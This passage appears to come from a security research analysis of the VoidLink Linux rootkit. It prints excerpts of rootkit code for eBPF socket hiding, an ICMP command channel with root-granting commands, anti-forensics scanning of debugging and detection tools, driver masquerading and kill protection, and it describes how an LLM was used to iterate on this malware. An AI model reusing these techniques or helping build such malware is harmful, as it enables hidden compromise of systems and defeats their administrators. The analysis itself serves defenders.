bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat</code> hiding, and it works reliably.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> utility, however, uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SOCK_DIAG_BY_FAMILY</code> Netlink interface to query socket information directly from the kernel. The response arrives as a chain of Netlink messages (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsghdr</code> structures), each containing an <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inet_diag_msg</code> with socket details. This is a completely different data path from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/tcp</code>, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">seq_show</code> kretprobes don’t affect it.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_test/</code> directory tells the story of VoidLink&#x27;s developers struggling to solve this problem. We found 10 sequential versions of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_ss.bpf.c</code> (v1 through v9, plus a &quot;final&quot; and &quot;full&quot; variant), each one attempting a different approach. The early versions tried to modify Netlink messages in kernel space, which proved unreliable. The later versions converged on the &quot;swallowing&quot; strategy used by the production variant.</p>
<p>The production eBPF program is located in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lkm_5x/ebpf/hide_ss.bpf.c</code> and hooks <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__sys_recvmsg</code> at both entry and return. On entry, it captures the userspace buffer address from the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">msghdr-&gt;msg_iov</code> chain:</p>
<pre><code>SEC(&quot;kprobe/__sys_recvmsg&quot;)
int kprobe_recvmsg(struct pt_regs *regs)
{
    __u32 k = 0;
    __u8 *e = bpf_map_lookup_elem(&amp;enabled, &amp;k);
    if (!e || !*e)
        return 0;

    void *msg = (void *)regs-&gt;si;
    if (!msg)
        return 0;

    void *msg_iov;
    struct iovec iov;
    if (bpf_probe_read_user(&amp;msg_iov, 8, msg + 16) &lt; 0 || !msg_iov)
        return 0;
    if (bpf_probe_read_user(&amp;iov, sizeof(iov), msg_iov) &lt; 0 || !iov.iov_base)
        return 0;

    __u64 id = bpf_get_current_pid_tgid();
    struct rctx_data d = { .buf = iov.iov_base, .len = iov.iov_len };
    bpf_map_update_elem(&amp;recvmsg_ctx, &amp;id, &amp;d, BPF_ANY);
    return 0;
}</code></pre>
<p>The buffer address and length are stored in a per-thread BPF hash map (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">recvmsg_ctx</code>), keyed by the thread&#x27;s PID/TID combination. This allows the return hook to retrieve the buffer address, even though it’s no longer available in the register state at function return.</p>
<p>The return hook is where the actual hiding occurs. After verifying that the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">recvmsg</code> call succeeded, it walks the Netlink message chain in the userspace buffer:</p>
<pre><code>SEC(&quot;kretprobe/__sys_recvmsg&quot;)
int kretprobe_recvmsg(struct pt_regs *regs)
{
    // ... setup and validation ...

    void *buf = d-&gt;buf;
    long offset = 0;
    long prev_offset = -1;
    __u32 prev_len = 0;

    #pragma unroll
    for (int i = 0; i &lt; 32; i++) {
        if (offset &gt;= ret || offset + NLMSG_HDRLEN &gt; ret)
            break;

        __u32 nlmsg_len;
        __u16 nlmsg_type;
        bpf_probe_read_user(&amp;nlmsg_len, 4, buf + offset);
        bpf_probe_read_user(&amp;nlmsg_type, 2, buf + offset + 4);

        int should_hide = 0;
        if (nlmsg_type == SOCK_DIAG_BY_FAMILY) {
            void *payload = buf + offset + NLMSG_HDRLEN;
            __u16 sport, dport;

            if (bpf_probe_read_user(&amp;sport, 2, payload + SPORT_OFF) == 0 &amp;&amp;
                bpf_probe_read_user(&amp;dport, 2, payload + DPORT_OFF) == 0) {

                sport = bpf_ntohs(sport);
                dport = bpf_ntohs(dport);

                if (bpf_map_lookup_elem(&amp;hidden_ports, &amp;sport) != NULL ||
                    bpf_map_lookup_elem(&amp;hidden_ports, &amp;dport) != NULL) {
                    should_hide = 1;
                }
            }
        }

        if (should_hide) {
            if (prev_offset &gt;= 0) {
                __u32 new_len = prev_len + nlmsg_len;
                bpf_probe_write_user(buf + prev_offset, &amp;new_len, 4);
            }
        } else {
            prev_offset = offset;
            prev_len = nlmsg_len;
        }

        offset += NLMSG_ALIGN(nlmsg_len);
    }
    // ...
}</code></pre>
<p>For each Netlink message of type <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SOCK_DIAG_BY_FAMILY</code>, the program reads the source and destination ports from fixed offsets within the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inet_diag_msg</code> payload (offsets 4 and 6, respectively). If either port matches an entry in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hidden_ports</code> BPF map, the message is &quot;swallowed&quot; by extending the previous message&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsg_len</code> to include the current message&#x27;s length. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf_probe_write_user()</code> call modifies the four-byte <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsg_len</code> field directly in the userspace buffer.</p>
<p>This technique works because Netlink parsers, including the one in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code>, advance through the message chain using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NLMSG_NEXT()</code>, which calculates the next message offset from the current message&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nlmsg_len</code>. By inflating the previous message&#x27;s length, the hidden message falls within the body of the previous message and is never parsed as a separate entry.</p>
<p>The same &quot;swallowing&quot; technique appears in the process-hiding experiments in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_test/directory</code>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_proc_v4.bpf.c</code> applies the identical approach to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getdents64</code>, extending the previous directory entry&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">d_reclen</code> to absorb the hidden entry. This shows the developers recognized the pattern&#x27;s general applicability and experimented with applying it beyond network hiding. We do note that process hiding via eBPF was ultimately handled by the LKM&#x27;s ftrace hook in the production variant, likely because the LKM approach was more reliable for the larger and more variable <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getdents64</code> buffers.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="the-icmp-covert-channel" class="absolute -top-32"></span>The ICMP covert channel</h2>
<p>Every VoidLink variant includes an ICMP-based command-and-control channel that leaves no listening ports, no filesystem artifacts, and, by design, no ICMP replies. The operator sends specially crafted ICMP Echo Request packets to the target host, and the rootkit&#x27;s Netfilter hook intercepts them before the kernel&#x27;s normal ICMP processing can generate a response. Commands are processed silently, and the packet is dropped.</p>
<p>The ICMP command protocol uses a simple but effective structure. The rootkit identifies its own traffic by checking the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">echo.id</code> field in the ICMP header for a magic value, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xC0DE</code>, by default. When a matching packet arrives, the rootkit extracts a 64-byte <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">icmp_cmd</code> structure from the payload:</p>
<pre><code>struct icmp_cmd {
    u8 cmd;           // Command byte
    u8 len;           // Length of data
    u8 data[62];      // XOR-encrypted payload
} __attribute__((packed));</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data</code> field is XOR-encrypted with a single-byte key, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x42</code> by default. While XOR with a known key is trivially reversible, it serves its purpose: preventing casual network monitoring tools from reading commands in cleartext without requiring the overhead of proper cryptography.</p>
<p>The command set evolved across generations. The production variant (v5) supports 10 distinct commands, ranging from hiding processes and ports to privilege escalation and self-destruction. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GIVE_ROOT</code> command (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x11</code>) is noteworthy: It takes a target PID as an argument and uses <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">prepare_creds()</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">commit_creds()</code> to set all UID and GID fields to zero for that process, effectively granting it root privileges without any authentication mechanism:</p>
<pre><code>case ICMP_CMD_GIVE_ROOT:
    if (cmd-&gt;len &gt;= 4) {
        u32 target_pid;
        memcpy(&amp;target_pid, cmd-&gt;data, 4);
        give_root_to_pid(target_pid);
    }
    break;</code></pre>
<p>The operator interacts with the rootkit through a Python script, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">icmp_ctl.py</code>, which constructs and sends the ICMP packets using raw sockets. The v5 version of this script provides a clean command line interface (CLI):</p>
<pre><code>./icmp_ctl.py 192.168.1.100 hide_pid 1234
./icmp_ctl.py 192.168.1.100 hide_port 8080
./icmp_ctl.py 192.168.1.100 hide_ip 10.0.0.50
./icmp_ctl.py 192.168.1.100 root 5678
./icmp_ctl.py 192.168.1.100 destruct</code></pre>
<p>One aspect that distinguishes VoidLink&#x27;s C2 from simpler rootkit implementations is runtime key rotation. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SET_KEY</code> command (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x20</code>) allows the operator to change both the ICMP magic identifier and the XOR key at runtime:</p>
<pre><code>case ICMP_CMD_SET_KEY:
    if (cmd-&gt;len &gt;= 3) {
        u16 new_magic;
        u8 new_key;
        memcpy(&amp;new_magic, cmd-&gt;data, 2);
        new_key = cmd-&gt;data[2];
        g_config.icmp_magic = new_magic;
        g_config.icmp_key = new_key;
    }
    break;</code></pre>
<p>After rotation, all subsequent commands must use the new magic and key values. This means that even if a defender discovers the initial <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xC0DE</code> signature through network monitoring, the operator can switch to a new value and continue operating. The v2 version of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">icmp_ctl.py</code> even includes a probe mode that iterates through a list of common magic values (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xC0DE</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xDEAD</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xBEEF</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xCAFE</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0xFACE</code>), sending a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SHOW_MOD</code> command with each one to rediscover a rootkit whose credentials were rotated by a previous operator.</p>
<p>The CentOS 7 variant additionally supports compile-time magic randomization through a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CONFIG_RANDOM_MAGIC</code> flag, which generates unique magic and key values at build time using the kernel&#x27;s random number generator. This would give each deployed instance a unique C2 signature, further complicating network-based detection.</p>
<p>From a detection perspective, the ICMP channel has one significant weakness: all command packets are silently dropped (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NF_DROP</code>), meaning that legitimate ICMP Echo Requests to the host will receive replies, while rootkit commands will not. A network monitoring system that correlates ICMP Echo Requests with their corresponding Echo Replies would notice the anomaly of unanswered pings.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="advanced-evasion-techniques" class="absolute -top-32"></span>Advanced evasion techniques</h2>
<p>Beyond its core hiding capabilities, VoidLink employs several advanced evasion techniques that suggest awareness of modern endpoint detection and response (EDR) behavior and forensic investigation methods. These features are concentrated in the latest &quot;Ultimate Stealth v5&quot; variant (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stealth_v5.c</code>), but some appear across all generations.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="delayed-initialization" class="absolute -top-32"></span>Delayed initialization</h3>
<p>Most rootkits install their hooks immediately during <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module_init()</code>. This means that any security tool monitoring module that loads, whether it checks for new kprobes, ftrace hooks, or syscall table modifications, can detect the rootkit at the time of insertion. VoidLink&#x27;s v5 variant counters this by deferring all hook installation by three seconds:</p>
<pre><code>static int __init mod_init(void)
{
    if (init_symbols() != 0)
        return -EFAULT;
    schedule_delayed_work(&amp;init_work, msecs_to_jiffies(3000));
    return 0;
}</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">mod_init()</code> function resolves a single symbol (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kallsyms_lookup_name</code> via the kprobe trick) and then returns success. The module appears loaded and benign, with no hooks, no Netfilter registrations, and no kretprobes. Three seconds later, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">delayed_init()</code> fires, installing all nine ftrace hooks, registering the Netfilter ICMP handler, starting the anti-debugging timer, and removing the module from the kernel&#x27;s module list.</p>
<p>This technique evades security tools that scan for suspicious module behavior in response to module-loading events. By the time the hooks are active, the initial security scan has already completed and may have marked the module as clean. The three-second delay is short enough to be operationally invisible but long enough to outlast any reasonable synchronous security check.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="anti-debugging-and-anti-forensics" class="absolute -top-32"></span>Anti-debugging and anti-forensics</h3>
<p>VoidLink implements an active anti-forensics capability that is uncommon among Linux rootkits. While Windows malware frequently checks for debugging tools, Linux rootkits rarely implement runtime detection of forensic utilities. VoidLink&#x27;s approach uses a kernel timer that fires every five seconds and iterates over the entire process list:</p>
<pre><code>static const char *debug_tools[] = {
    &quot;strace&quot;, &quot;ltrace&quot;, &quot;gdb&quot;, &quot;perf&quot;, &quot;bpftool&quot;,
    &quot;bpftrace&quot;, &quot;systemtap&quot;, &quot;crash&quot;, &quot;kdb&quot;, &quot;trace-cmd&quot;,
    &quot;ftrace&quot;, &quot;sysdig&quot;, &quot;dtrace&quot;, NULL
};

static void anti_debug_scan(struct timer_list *t)
{
    struct task_struct *task;
    bool detected = false;

    rcu_read_lock();
    for_each_process(task) {
        if (is_debug_tool(task-&gt;comm)) {
            detected = true;
            break;
        }
    }
    rcu_read_unlock();

    if (detected &amp;&amp; !g_data.debug_detected) {
        g_data.debug_detected = true;
    } else if (!detected &amp;&amp; g_data.debug_detected) {
        g_data.debug_detected = false;
    }

    mod_timer(&amp;anti_debug_timer,
              jiffies + msecs_to_jiffies(ANTI_DEBUG_INTERVAL));
}</code></pre>
<p>The tool list is comprehensive: It covers standard debugging tools (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">strace</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gdb</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ltrace</code>), performance analysis utilities (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">perf</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">trace-cmd</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sysdig</code>), eBPF inspection tools (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpftool</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpftrace</code>), and rootkit detection utilities (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rkhunter</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">chkrootkit</code> in the CentOS 7 variant). The scan uses <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">for_each_process()</code> under read-copy-update (RCU) lock protection, checking each task&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">comm</code> field against the tool list. When a debugging tool is detected, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">debug_detected</code> flag is set. The CentOS 7 variant goes further: It can optionally pause all hiding operations or trigger self-destruction when forensic tools are detected.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="module-masquerading" class="absolute -top-32"></span>Module masquerading</h3>
<p>Every VoidLink variant disguises its kernel module metadata to impersonate a legitimate AMD driver:</p>
<pre><code>MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;Advanced Micro Devices, Inc.&quot;);
MODULE_DESCRIPTION(&quot;AMD Memory Encryption Support&quot;);
MODULE_VERSION(&quot;3.0&quot;);</code></pre>
<p>The real <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">amd_mem_encrypt</code> module is a legitimate part of <a href="https://www.amd.com/en/developer/sev.html">AMD&#x27;s Secure Memory Encryption (SME) and Secure Encrypted Virtualization (SEV)</a> support in the Linux kernel. By copying its metadata, VoidLink makes its <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modinfo</code> output indistinguishable from the real driver. This disguise is particularly effective on cloud instances and virtual machines, where AMD-related kernel modules are commonly present and rarely questioned.</p>
<p>The v5 variant takes this further by XOR-encrypting the module name string and decoding it at runtime:</p>
<pre><code>static char obf_modname[] = {
    &#x27;a&#x27;^ICMP_KEY, &#x27;m&#x27;^ICMP_KEY, &#x27;d&#x27;^ICMP_KEY, &#x27;_&#x27;^ICMP_KEY,
    &#x27;m&#x27;^ICMP_KEY, &#x27;e&#x27;^ICMP_KEY, &#x27;m&#x27;^ICMP_KEY, &#x27;_&#x27;^ICMP_KEY,
    &#x27;e&#x27;^ICMP_KEY, &#x27;n&#x27;^ICMP_KEY, &#x27;c&#x27;^ICMP_KEY, &#x27;r&#x27;^ICMP_KEY,
    &#x27;y&#x27;^ICMP_KEY, &#x27;p&#x27;^ICMP_KEY, &#x27;t&#x27;^ICMP_KEY, 0
};

static void decrypt_string(char *dst, const char *src, u8 key)
{
    while (*src) { *dst++ = *src++ ^ key; }
    *dst = 0;
}</code></pre>
<p>This prevents simple string scanning of the compiled <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ko</code> binary from revealing the disguise name. While the XOR key (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x42</code>) is trivially discoverable, the obfuscation adds a layer that defeats basic <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">strings</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">grep</code> analysis.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="process-protection" class="absolute -top-32"></span>Process protection</h3>
<p>The v5 variant introduces kill protection for designated processes. By hooking <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">do_send_sig_info</code> via ftrace, the rootkit intercepts all signal deliveries and silently discards lethal signals sent to protected PIDs:</p>
<pre><code>if (chk_protected(p-&gt;pid)) {
    if (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP ||
        sig == SIGINT || sig == SIGHUP || sig == SIGQUIT) {
        return 0;  // Pretend success but don&#x27;t deliver
    }
}</code></pre>
<p>The intercepted signals include <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGKILL</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGTERM</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGSTOP</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGINT</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGHUP</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SIGQUIT</code>, covering all common methods an administrator might use to terminate or suspend a process. The hook returns zero (success) to the caller, making the caller believe that the signal was delivered, when it was actually discarded. Additionally, signals sent to hidden (but not specifically protected) processes return <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-ESRCH</code> (&quot;No such process&quot;), maintaining the illusion that the process doesn’t exist.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="the-memfd-aware-boot-loader" class="absolute -top-32"></span>The memfd-aware boot loader</h3>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">load_lkm.sh</code> script reveals that VoidLink is designed to operate as part of a larger attack toolkit. Before loading the rootkit, the script scans <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/*/exe</code> for any process running from a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> file descriptor:</p>
<pre><code>for pid in $(ls /proc 2&gt;/dev/null | grep -E &quot;^[0-9]+$&quot;); do
    exe=$(readlink /proc/$pid/exe 2&gt;/dev/null)
    if [[ &quot;$exe&quot; == *&quot;memfd&quot;* ]]; then
        IMPLANT_PIDS=&quot;$IMPLANT_PIDS $pid&quot;
    fi
done</code></pre>
<p>A <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> file descriptor, created by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd_create()</code>, represents an anonymous in-memory file with no on-disk backing. Processes running from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> are a strong indicator of <em>fileless implants</em>: that is, malware that exists only in memory and leaves no file on the filesystem. The boot script automatically passes any discovered <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> process PIDs to the rootkit as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_pids</code>, ensuring that they’re hidden immediately upon rootkit activation.</p>
<p>This integration tells us that VoidLink isn’t a stand-alone tool. It’s designed to complement a separate fileless implant, likely a reverse shell or beacon, that the operator deploys first. The rootkit&#x27;s job is to make that implant invisible to administrators and security tools.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="evidence-of-llm-assisted-development" class="absolute -top-32"></span>Evidence of LLM-assisted development</h2>
<p>Check Point Research&#x27;s <a href="https://research.checkpoint.com/2026/voidlink-early-ai-generated-malware-framework/">second publication on VoidLink</a> established that the broader framework was built using AI-driven development through the TRAE IDE, with sprint-planning documents, coding guidelines, and structured specifications all generated by an LLM. The rootkit source code in our data dump independently corroborates this finding and provides additional granular evidence at the code level. While the rootkit&#x27;s technical sophistication is genuine, the patterns in its source code, comments, and development history offer a ground-level view of how LLM-assisted iteration produced kernel-level malware.</p>
<p>The most compelling evidence comes from the phase-numbered refactoring annotations in the CentOS 7 variant. The file header contains a structured changelog that reads like a series of LLM conversation turns: &quot;Fix the security issues&quot; (Phase 1), &quot;Now improve stealth&quot; (Phase 2), &quot;Add compatibility&quot; (Phase 3), &quot;Improve stability&quot; (Phase 4), &quot;Add defense mechanisms&quot; (Phase 5). Individual code changes are tagged throughout with identifiers like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[1.1]</code> for the first fix in Phase 1, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[2.3]</code> for the third fix in Phase 2, and so on. This systematic tagging matches the pattern of iterative LLM prompting, where a user requests a category of improvements and the model implements and numbers each one.</p>
<p>The comment style throughout VoidLink is tutorial-like in a way that experienced kernel developers wouldn’t produce. Consider this annotation on a single XOR decryption loop:</p>
<pre><code>// XOR decryption
for (i = 0; i &lt; cmd-&gt;len; i++)
    cmd-&gt;data[i] ^= g_config.icmp_key;</code></pre>
<p>An experienced kernel developer wouldn’t annotate a three-line XOR loop with a comment explaining that it performs XOR decryption. This kind of pedagogical annotation is characteristic of LLM output, where the model explains every step for the user&#x27;s benefit, regardless of its obviousness.</p>
